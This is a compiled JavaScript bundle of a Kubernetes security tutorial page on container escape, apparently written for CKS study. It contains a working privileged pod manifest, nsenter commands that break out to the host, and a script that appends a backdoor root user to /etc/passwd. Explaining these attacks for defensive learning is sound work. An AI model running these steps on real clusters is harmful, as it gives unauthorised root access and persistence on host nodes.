"use strict";(globalThis.webpackChunkk_8_s_security=globalThis.webpackChunkk_8_s_security||[]).push([[2602],{953(e,t,n){n.r(t),n.d(t,{assets:()=>l,contentTitle:()=>o,default:()=>h,frontMatter:()=>c,metadata:()=>s,toc:()=>d});const s=JSON.parse('{"id":"attack-vectors/privileged-container-escape","title":"Container Escape","description":"How an attacker can break out of a container and gain control over the host system in Kubernetes.","source":"@site/docs/attack-vectors/privileged-container-escape.md","sourceDirName":"attack-vectors","slug":"/attack-vectors/privileged-container-escape","permalink":"/kubernetes-security/attack-vectors/privileged-container-escape","draft":false,"unlisted":false,"editUrl":"https://github.com/geek-kb/k8s_security/edit/main/docs/attack-vectors/privileged-container-escape.md","tags":[{"inline":true,"label":"attack-vector","permalink":"/kubernetes-security/tags/attack-vector"},{"inline":true,"label":"container-escape","permalink":"/kubernetes-security/tags/container-escape"},{"inline":true,"label":"pod-security","permalink":"/kubernetes-security/tags/pod-security"},{"inline":true,"label":"runtime","permalink":"/kubernetes-security/tags/runtime"},{"inline":true,"label":"CKS","permalink":"/kubernetes-security/tags/cks"}],"version":"current","lastUpdatedBy":"Itai Ganot","lastUpdatedAt":1771236448000,"sidebarPosition":8,"frontMatter":{"sidebar_position":8,"title":"Container Escape","description":"How an attacker can break out of a container and gain control over the host system in Kubernetes.","keywords":["kubernetes security","container escape","privileged container","docker breakout","host access","container security","pod security","namespace escape","kernel exploit","CKS"],"tags":["attack-vector","container-escape","pod-security","runtime","CKS"],"related":["/kubernetes-security/best-practices/cluster-setup-and-hardening/pod-security/container-escape-mitigation/","/kubernetes-security/best-practices/cluster-setup-and-hardening/pod-security/pod-security-standards/","/kubernetes-security/best-practices/cluster-setup-and-hardening/pod-security/seccomp-in-pods/","/kubernetes-security/attack-vectors/unrestricted-hostpath-mounts/"]},"sidebar":"default","previous":{"title":"Misconfigured Admission Controllers","permalink":"/kubernetes-security/attack-vectors/misconfigured-admission-controllers"},"next":{"title":"Denial of Service (DoS) Attacks","permalink":"/kubernetes-security/attack-vectors/ddos-attacks"}}');var a=n(4848),r=n(8453),i=n(9844);const c={sidebar_position:8,title:"Container Escape",description:"How an attacker can break out of a container and gain control over the host system in Kubernetes.",keywords:["kubernetes security","container escape","privileged container","docker breakout","host access","container security","pod security","namespace escape","kernel exploit","CKS"],tags:["attack-vector","container-escape","pod-security","runtime","CKS"],related:["/kubernetes-security/best-practices/cluster-setup-and-hardening/pod-security/container-escape-mitigation/","/kubernetes-security/best-practices/cluster-setup-and-hardening/pod-security/pod-security-standards/","/kubernetes-security/best-practices/cluster-setup-and-hardening/pod-security/seccomp-in-pods/","/kubernetes-security/attack-vectors/unrestricted-hostpath-mounts/"]},o="Container Escape",l={},d=[{value:"Exploitation Steps",id:"exploitation-steps",level:2},{value:"Deploy a Privileged Pod",id:"deploy-a-privileged-pod",level:3},{value:"Option 1: Escape Using Manual Namespace Entry",id:"option-1-escape-using-manual-namespace-entry",level:3},{value:"1. Check the Container Environment",id:"1-check-the-container-environment",level:4},{value:"2. Enter Host Namespaces with <code>nsenter</code>",id:"2-enter-host-namespaces-with-nsenter",level:4},{value:"3. Create a Persistent Root User",id:"3-create-a-persistent-root-user",level:4},{value:"Option 2: Run an Automated Escape Script",id:"option-2-run-an-automated-escape-script",level:3},{value:"Result",id:"result",level:3},{value:"Mitigation",id:"mitigation",level:2},{value:"References",id:"references",level:2}];function p(e){const t={a:"a",code:"code",h1:"h1",h2:"h2",h3:"h3",h4:"h4",header:"header",hr:"hr",li:"li",ol:"ol",p:"p",pre:"pre",strong:"strong",...(0,r.R)(),...e.components};return(0,a.jsxs)(a.Fragment,{children:[(0,a.jsx)(t.header,{children:(0,a.jsx)(t.h1,{id:"container-escape",children:"Container Escape"})}),"\n",(0,a.jsxs)(t.p,{children:["A ",(0,a.jsx)(t.strong,{children:"container escape"})," occurs when an attacker breaks out of the container isolation boundary and gains access to the underlying host system. This leads to a full compromise of the node, potentially including root access, system tampering, and lateral movement across the cluster."]}),"\n",(0,a.jsx)(t.hr,{}),"\n",(0,a.jsx)(t.h2,{id:"exploitation-steps",children:"Exploitation Steps"}),"\n",(0,a.jsxs)(t.p,{children:["An attacker targets a misconfigured container with elevated privileges. The following pod manifest is a ",(0,a.jsx)(t.strong,{children:"prerequisite"})," for all container escape paths, as it grants the attacker access to sensitive host namespaces and kernel features."]}),"\n",(0,a.jsx)(t.h3,{id:"deploy-a-privileged-pod",children:"Deploy a Privileged Pod"}),"\n",(0,a.jsx)(t.pre,{children:(0,a.jsx)(t.code,{className:"language-yaml",children:'apiVersion: v1\nkind: Pod\nmetadata:\n  name: test\nspec:\n  hostPID: true\n  containers:\n    - image: busybox\n      name: test\n      command: ["sleep", "infinity"]\n      securityContext:\n        runAsUser: 0\n        allowPrivilegeEscalation: true\n        privileged: true\n  restartPolicy: Always\n'})}),"\n",(0,a.jsx)(t.pre,{children:(0,a.jsx)(t.code,{className:"language-bash",children:"kubectl apply -f test-pod.yaml\n"})}),"\n",(0,a.jsx)(t.p,{children:"Once the privileged pod is running, the attacker proceeds using one of the following options."}),"\n",(0,a.jsx)(t.hr,{}),"\n",(0,a.jsx)(t.h3,{id:"option-1-escape-using-manual-namespace-entry",children:"Option 1: Escape Using Manual Namespace Entry"}),"\n",(0,a.jsx)(t.h4,{id:"1-check-the-container-environment",children:"1. Check the Container Environment"}),"\n",(0,a.jsx)(t.p,{children:"Verify if the container has access to the host\u2019s mount namespace:"}),"\n",(0,a.jsx)(t.pre,{children:(0,a.jsx)(t.code,{className:"language-bash",children:"ls -l /proc/1/ns/mnt\n"})}),"\n",(0,a.jsx)(t.p,{children:"Inspect if the host filesystem is visible:"}),"\n",(0,a.jsx)(t.pre,{children:(0,a.jsx)(t.code,{className:"language-bash",children:"ls /proc/1/root\n"})}),"\n",(0,a.jsxs)(t.h4,{id:"2-enter-host-namespaces-with-nsenter",children:["2. Enter Host Namespaces with ",(0,a.jsx)(t.code,{children:"nsenter"})]}),"\n",(0,a.jsx)(t.pre,{children:(0,a.jsx)(t.code,{className:"language-bash",children:"nsenter --target 1 --mount --uts --ipc --net --pid /bin/sh\n"})}),"\n",(0,a.jsx)(t.p,{children:"Verify the escape by checking:"}),"\n",(0,a.jsx)(t.pre,{children:(0,a.jsx)(t.code,{className:"language-bash",children:"hostname\nwhoami\n"})}),"\n",(0,a.jsxs)(t.p,{children:["If the hostname matches the host and the user is ",(0,a.jsx)(t.code,{children:"root"}),", the escape was successful."]}),"\n",(0,a.jsx)(t.h4,{id:"3-create-a-persistent-root-user",children:"3. Create a Persistent Root User"}),"\n",(0,a.jsx)(t.pre,{children:(0,a.jsx)(t.code,{className:"language-bash",children:"echo 'attacker:x:0:0::/root:/bin/bash' >> /etc/passwd\ngrep attacker /etc/passwd\n"})}),"\n",(0,a.jsx)(t.hr,{}),"\n",(0,a.jsx)(t.h3,{id:"option-2-run-an-automated-escape-script",children:"Option 2: Run an Automated Escape Script"}),"\n",(0,a.jsx)(t.p,{children:"Instead of manually running commands, the attacker may use a single script to automate the escape and persistence steps:"}),"\n",(0,a.jsx)(t.pre,{children:(0,a.jsx)(t.code,{className:"language-bash",children:'#!/bin/sh\n\necho "[*] Checking if the container has access to the host\'s root filesystem..."\nif [ ! -d "/proc/1/root" ]; then\n    echo "[-] Cannot access /proc/1/root. Escape is not possible."\n    exit 1\nfi\n\necho "[+] Host root filesystem detected at /proc/1/root."\necho "[*] Attempting to enter the host\'s namespaces..."\n\nexec nsenter --target 1 --mount --uts --ipc --net --pid --root=/proc/1/root /bin/sh -c \'\n    echo "[+] Successfully entered host namespaces."\n    echo "[*] Adding attacker user to /etc/passwd..."\n    echo "attacker:x:0:0::/root:/bin/bash" >> /etc/passwd\n    grep attacker /etc/passwd\n    echo "[*] Checking system state..."\n    echo "Hostname: $(hostname)"\n    echo "User: $(whoami)"\n    ps aux | grep kubelet\n    exec /bin/sh\n\'\n'})}),"\n",(0,a.jsx)(t.hr,{}),"\n",(0,a.jsx)(t.h3,{id:"result",children:"Result"}),"\n",(0,a.jsxs)(t.p,{children:["The attacker achieves ",(0,a.jsx)(t.strong,{children:"interactive root access on the host node"}),". This breaks the container isolation model and enables full control over the host, including the ability to persist, modify system configurations, and pivot to other parts of the cluster."]}),"\n",(0,a.jsx)(t.hr,{}),"\n",(0,a.jsx)(t.h2,{id:"mitigation",children:"Mitigation"}),"\n",(0,a.jsxs)(t.p,{children:["\u27a1 ",(0,a.jsx)(t.a,{href:"/kubernetes-security/best-practices/cluster-setup-and-hardening/pod-security/container-escape-mitigation",children:"Preventing Container Escape"})]}),"\n",(0,a.jsx)(t.hr,{}),"\n","\n",(0,a.jsx)(i.A,{asin:"B0F6T216R6",title:"Container Security",author:"Liz Rice",context:"Deep dive into Linux primitives that underpin container isolation, including namespaces, cgroups, and capabilities. Essential for understanding how container escapes work and how to prevent them."}),"\n",(0,a.jsx)(t.hr,{}),"\n",(0,a.jsx)(t.h2,{id:"references",children:"References"}),"\n",(0,a.jsx)(t.p,{children:"This article is based on information from the following official sources:"}),"\n",(0,a.jsxs)(t.ol,{children:["\n",(0,a.jsxs)(t.li,{children:[(0,a.jsx)(t.a,{href:"https://kubernetes.io/docs/concepts/security/pod-security-standards/",children:"Pod Security Standards"})," - Kubernetes Documentation"]}),"\n",(0,a.jsxs)(t.li,{children:[(0,a.jsx)(t.a,{href:"https://kubernetes.io/docs/tasks/configure-pod-container/security-context/",children:"Configure a Security Context for a Pod or Container"})," - Kubernetes Documentation"]}),"\n",(0,a.jsxs)(t.li,{children:[(0,a.jsx)(t.a,{href:"https://man7.org/linux/man-pages/man7/namespaces.7.html",children:"Linux namespaces"})," - Linux Manual Pages"]}),"\n"]})]})}function h(e={}){const{wrapper:t}={...(0,r.R)(),...e.components};return t?(0,a.jsx)(t,{...e,children:(0,a.jsx)(p,{...e})}):p(e)}},8453(e,t,n){n.d(t,{R:()=>i,x:()=>c});var s=n(6540);const a={},r=s.createContext(a);function i(e){const t=s.useContext(r);return s.useMemo(function(){return"function"==typeof e?e(t):{...t,...e}},[t,e])}function c(e){let t;return t=e.disableParentContext?"function"==typeof e.components?e.components(a):e.components||a:i(e.components),s.createElement(r.Provider,{value:t},e.children)}},9844(e,t,n){n.d(t,{A:()=>g});n(6540);const s="container_uAmn",a="header_w8P2",r="card_ffKO",i="cta_Lcp_",c="imageWrapper_T7s1",o="image_RiaB",l="content_HbQP",d="title_yIho",p="author_pwLQ",h="context_VbHg",u="disclosure_H5FU";var m=n(4848);function g({asin:e,title:t,author:n,context:g}){const x=`https://www.amazon.com/dp/${e}?tag=k8ssecurity-20`,k=`https://images-na.ssl-images-amazon.com/images/P/${e}.01._SCLZZZZZZZ_.jpg`;return(0,m.jsxs)("div",{className:s,children:[(0,m.jsx)("div",{className:a,children:"Recommended Reading"}),(0,m.jsxs)("a",{href:x,target:"_blank",rel:"noopener noreferrer",className:r,children:[(0,m.jsx)("div",{className:c,children:(0,m.jsx)("img",{src:k,alt:t,className:o,loading:"lazy"})}),(0,m.jsxs)("div",{className:l,children:[(0,m.jsx)("div",{className:d,children:t}),(0,m.jsxs)("div",{className:p,children:["by ",n]}),(0,m.jsx)("div",{className:h,children:g}),(0,m.jsx)("div",{className:i,children:"View on Amazon"})]})]}),(0,m.jsx)("div",{className:u,children:"As an Amazon Associate, I earn from qualifying purchases."})]})}}}]);